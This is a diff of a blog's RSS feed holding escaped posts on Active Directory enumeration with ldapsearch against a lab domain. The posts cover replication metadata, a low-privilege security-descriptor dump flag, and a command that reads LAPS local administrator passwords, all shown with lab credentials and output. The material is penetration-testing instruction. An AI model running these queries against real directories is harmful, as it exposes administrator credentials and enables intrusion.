+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name:: YmxhaDEKREVMOjJmN2IxOWIxLTlkZWUtNGE0OC04YmIwLWFkNjJlNmEyODdlZg&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectGUID:: sRl7L+6dSEqLsK1i5qKH7w&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;userAccountControl: &lt;span style=&#34;color:#ae81ff&#34;&gt;4128&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectSid:: AQUAAAAAAAUVAAAAfS9vpuKLWG5ZpW7N9RUAAA&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sAMAccountName: BLAH1$
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lastKnownParent: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Computers,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;isRecycled: TRUE
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;replication-metadata&#34;&gt;Replication Metadata&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;src: &lt;a href=&#34;https://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19&#34;&gt;https://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;src: &lt;a href=&#34;https://stackoverflow.com/a/38710484&#34;&gt;https://stackoverflow.com/a/38710484&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This is one place where ldapsearch isn&amp;rsquo;t quite as cool as other tools, all of the base64 output. I did &lt;a href=&#34;https://stackoverflow.com/a/38710484&#34;&gt;find a great way to decode most of it&lt;/a&gt; on StackOverflow:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;| perl -MMIME::Base64 -n -00 -e &#39;s/\n +//g;s/(?&amp;lt;=:: )(\S+)/decode_base64($1)/eg;print&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Basically you are pipeing the output of &lt;code&gt;ldapsearch&lt;/code&gt; into a bit of perl that Base64 decodes anything that looks like Base64.&lt;/p&gt;
+&lt;p&gt;Back on track, there is a ton of great info in Replication metadata but the blog post from SpecterOps above.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h 192.168.80.10 -o ldif-wrap&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no -x -w ASDqwe123 -D sittingduck&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Administrator,CN=Users,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; msDS-ReplAttributeMetaData                       &lt;span style=&#34;color:#75715e&#34;&gt;# extended LDIF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# LDAPv3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# base &amp;lt;CN=Administrator,CN=Users,DC=sittingduck,DC=info&amp;gt; with scope subtree&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# filter: (objectclass=*)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# requesting: msDS-ReplAttributeMetaData&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Administrator, Users, sittingduck.info&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Administrator,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ReplAttributeMetaData:: PERTX1JFUExfQVRUUl9NRVRBX0RBVEE+Cgk8cHN6QXR0cmlidXRlTmFtZT5tc0RTLVN1cHBvcnRlZEVuY3J5cHRpb25UeXBlczwvcHN6QXR0cmlidXRlTmFtZT4KCTxkd1ZlcnNpb24+MTwvZHdWZXJzaW9uPgoJPGZ0aW1lTGFzdE9y
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;aWdpbmF0aW5nQ2hhbmdlPjIwMTUtMTAtMTRUMDM6Mjg6MTRaPC9mdGltZUxhc3RPcmlnaW5hdGluZ0NoYW5nZT4KCTx1dWlkTGFzdE9yaWdpbmF0aW5nRHNhSW52b2NhdGlvbklEPjhkMmExZjVjLTU4ZDQtNGVmYS1iY2QyLWY3ZDg1ZWY1MzAxMzwvdXVpZExhc3RPcmlna
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;W5hdGluZ0RzYUludm9jYXRpb25JRD4KCTx1c25PcmlnaW5hdGluZ0NoYW5nZT4xMjc3NjwvdXNuT3JpZ2luYXRpbmdDaGFuZ2U+Cgk8dXNuTG9jYWxDaGFuZ2U+MTI3NzY8L3VzbkxvY2FsQ2hhbmdlPgoJPHBzekxhc3RPcmlnaW5hdGluZ0RzYUROPjwvcHN6TGFzdE9yaW
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dpbmF0aW5nRHNhRE4+CjwvRFNfUkVQTF9BVFRSX01FVEFfREFUQT4KAA&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ReplAttributeMetaData:: PERTX1JFUExfQVRUUl9NRVRBX0RBVEE+Cgk8cHN6QXR0cmlidXRlTmFtZT5sYXN0TG9nb25UaW1lc3RhbXA8L3BzekF0dHJpYnV0ZU5hbWU+Cgk8ZHdWZXJzaW9uPjI8L2R3VmVyc2lvbj4KCTxmdGltZUxhc3RPcmlnaW5hdGluZ0No
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;YW5nZT4yMDE3LTA2LTIwVDAwOjE3OjIyWjwvZnRpbWVMYXN0T3JpZ2luYXRpbmdDaGFuZ2U+Cgk8dXVpZExhc3RPcmlnaW5hdGluZ0RzYUludm9jYXRpb25JRD4yOWJkZWQ4MS0xMGRmLTQ0YTMtOGVkNi0xOWY1ODJjYjhiNGU8L3V1aWRMYXN0T3JpZ2luYXRpbmdEc2FJb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nZvY2F0aW9uSUQ+Cgk8dXNuT3JpZ2luYXRpbmdDaGFuZ2U+MzQzOTQ2PC91c25PcmlnaW5hdGluZ0NoYW5nZT4KCTx1c25Mb2NhbENoYW5nZT4zNDM5NDY8L3VzbkxvY2FsQ2hhbmdlPgoJPHBzekxhc3RPcmlnaW5hdGluZ0RzYUROPjwvcHN6TGFzdE9yaWdpbmF0aW5nRH
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NhRE4+CjwvRFNfUkVQTF9BVFRSX01FVEFfREFUQT4KAA&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the Perl trick:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h 192.168.80.10 -o ldif-wrap&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no -x -w ASDqwe123 -D sittingduck&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Administrator,CN=Users,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; msDS-ReplAttributeMetaData | perl -MMIME::Base64
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-n -00 -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/\n +//g;s/(?&amp;lt;=:: )(\S+)/decode_base64($1)/eg;print&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# extended LDIF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# LDAPv3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# base &amp;lt;CN=Administrator,CN=Users,DC=sittingduck,DC=info&amp;gt; with scope subtree&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# filter: (objectclass=*)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# requesting: msDS-ReplAttributeMetaData&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Administrator, Users, sittingduck.info&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Administrator,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Users,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ReplAttributeMetaData:: &amp;lt;DS_REPL_ATTR_META_DATA&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;pszAttributeName&amp;gt;msDS-SupportedEncryptionTypes&amp;lt;/pszAttributeName&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;dwVersion&amp;gt;1&amp;lt;/dwVersion&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;ftimeLastOriginatingChange&amp;gt;2015-10-14T03:28:14Z&amp;lt;/ftimeLastOriginatingChange&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;uuidLastOriginatingDsaInvocationID&amp;gt;8d2a1f5c-58d4-4efa-bcd2-f7d85ef53013&amp;lt;/uuidLastOriginatingDsaInvocationID&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;usnOriginatingChange&amp;gt;12776&amp;lt;/usnOriginatingChange&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;usnLocalChange&amp;gt;12776&amp;lt;/usnLocalChange&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;pszLastOriginatingDsaDN&amp;gt;&amp;lt;/pszLastOriginatingDsaDN&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/DS_REPL_ATTR_META_DATA&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msDS-ReplAttributeMetaData:: &amp;lt;DS_REPL_ATTR_META_DATA&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;pszAttributeName&amp;gt;lastLogonTimestamp&amp;lt;/pszAttributeName&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;dwVersion&amp;gt;2&amp;lt;/dwVersion&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;ftimeLastOriginatingChange&amp;gt;2017-06-20T00:17:22Z&amp;lt;/ftimeLastOriginatingChange&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;uuidLastOriginatingDsaInvocationID&amp;gt;29bded81-10df-44a3-8ed6-19f582cb8b4e&amp;lt;/uuidLastOriginatingDsaInvocationID&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;usnOriginatingChange&amp;gt;343946&amp;lt;/usnOriginatingChange&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;usnLocalChange&amp;gt;343946&amp;lt;/usnLocalChange&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;pszLastOriginatingDsaDN&amp;gt;&amp;lt;/pszLastOriginatingDsaDN&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/DS_REPL_ATTR_META_DATA&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;ntsecuritydescriptor&#34;&gt;NTSecurityDescriptor&lt;/h3&gt;
+&lt;p&gt;While I personally don&amp;rsquo;t recall ever running into an instance where I wasn&amp;rsquo;t able to read the security descriptor via ldapsearch, it&amp;rsquo;s just because I&amp;rsquo;ve only went after very specific objects and not that it never happens. Lee Christensen (&lt;a href=&#34;https://twitter.com/tifkin_&#34;&gt;@tifkin_&lt;/a&gt;) figured out a way to read security descriptors as low privileged users. Honestly I don&amp;rsquo;t know how it works, but here it is:&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://twitter.com/tifkin_/status/1372628611677753344&#34;&gt;https://twitter.com/tifkin_/status/1372628611677753344&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Ever want to dump AD security descriptors from an OS X or Linux machine using ldapsearch as a low priv&amp;rsquo;ed user? Add the following argument:&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;-E &#39;!1.2.840.113556.1.4.801=::MAMCAQc=&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Ever want to dump AD security descriptors from an OS X or Linux machine using ldapsearch as a low priv&amp;#39;ed user? Add the following argument: &lt;br&gt;&lt;br&gt;-E &amp;#39;!1.2.840.113556.1.4.801=::MAMCAQc=&amp;#39; &lt;a href=&#34;https://t.co/vMi7RPsYPB&#34;&gt;pic.twitter.com/vMi7RPsYPB&lt;/a&gt;&lt;/p&gt;&amp;mdash; Lee Christensen (@tifkin_) &lt;a href=&#34;https://twitter.com/tifkin_/status/1372628611677753344?ref_src=twsrc%5Etfw&#34;&gt;March 18, 2021&lt;/a&gt;&lt;/blockquote&gt;
+&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
+
+&lt;h3 id=&#34;ad-password-dumping-via-ldap&#34;&gt;AD Password Dumping via LDAP&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;src: &lt;a href=&#34;https://stackoverflow.com/questions/59406408/is-there-any-way-to-retrieve-password-hashes-from-an-active-directory-via-ldap&#34;&gt;https://stackoverflow.com/questions/59406408/is-there-any-way-to-retrieve-password-hashes-from-an-active-directory-via-ldap&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;src: &lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2&#34;&gt;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Every so often I forget it&amp;rsquo;s &lt;strong&gt;not possible&lt;/strong&gt; to sync passwords from the &lt;code&gt;unicodePwd&lt;/code&gt; attribute. I&amp;rsquo;m saving this here mostly so I don&amp;rsquo;t waste my time trying again.&lt;/p&gt;
+&lt;p&gt;From MSDN:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The unicodePwd attribute is never returned by an LDAP search.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
+&lt;p&gt;For futher info, the &lt;a href=&#34;https://ldapwiki.com/wiki/&#34;&gt;LDAP Wiki&lt;/a&gt; is an amazing resource.&lt;/p&gt;
+&lt;h3 id=&#34;ropnops-talk-at-troopers-2019&#34;&gt;Ropnop&amp;rsquo;s Talk at Troopers 2019&lt;/h3&gt;
+&lt;p&gt;You should absolutely check out &lt;a href=&#34;https://twitter.com/ropnop&#34;&gt;Ropnop&lt;/a&gt; (and follow him on Twitter) if you want to learn more.&lt;/p&gt;
+&lt;script async class=&#34;speakerdeck-embed&#34; data-id=&#34;af116568615748f79ab794a862d2ef1d&#34; data-ratio=&#34;1.77777777777778&#34; src=&#34;//speakerdeck.com/assets/embed.js&#34;&gt;&lt;/script&gt;
+</description>
+    </item>
     
     <item>
       <title>Dump LAPS passwords with ldapsearch</title>
@@ -32,9 +482,9 @@
 &lt;p&gt;There is already a Metasploit module thanks to &lt;a href=&#34;https://github.com/Meatballs1&#34;&gt;Meatballs&lt;/a&gt;:
 &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb&#34;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb&lt;/a&gt;. But, unfortunately I don&amp;rsquo;t always have access to a Meterpreter session to run the module.&lt;/p&gt;
 &lt;p&gt;Using &lt;code&gt;ldapsearch&lt;/code&gt; (which is included in the package &lt;code&gt;ldapscripts&lt;/code&gt; on Debian/Ubuntu) can be used to make the same query that the module does. Here is an example run:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;ldapsearch -x -h 192.168.80.10 -D \
-&amp;quot;helpdesk&amp;quot; -w ASDqwe123 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; \
-&amp;quot;(ms-MCS-AdmPwd=*)&amp;quot; ms-MCS-AdmPwd
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ldapsearch -x -h 192.168.80.10 -D \
+&amp;#34;helpdesk&amp;#34; -w ASDqwe123 -b &amp;#34;dc=sittingduck,dc=info&amp;#34; \
+&amp;#34;(ms-MCS-AdmPwd=*)&amp;#34; ms-MCS-AdmPwd
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Lets break this down:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;-x&lt;/code&gt; - Use basic authentication&lt;/li&gt;
@@ -45,7 +495,7 @@
 &lt;li&gt;&lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; - Only show me the &lt;code&gt;ms-MCS-AdmPwd&lt;/code&gt; object (which by default includes the object name and DN so you will still know what host it belongs to)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;What does that look like?&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;$ ldapsearch -x -h 192.168.80.10 -D &amp;quot;helpdesk&amp;quot; -w ASDqwe123 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; &amp;quot;(ms-MCS-AdmPwd=*)&amp;quot; ms-MCS-AdmPwd
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ldapsearch -x -h 192.168.80.10 -D &amp;#34;helpdesk&amp;#34; -w ASDqwe123 -b &amp;#34;dc=sittingduck,dc=info&amp;#34; &amp;#34;(ms-MCS-AdmPwd=*)&amp;#34; ms-MCS-AdmPwd
 # extended LDIF
 #
 # LDAPv3
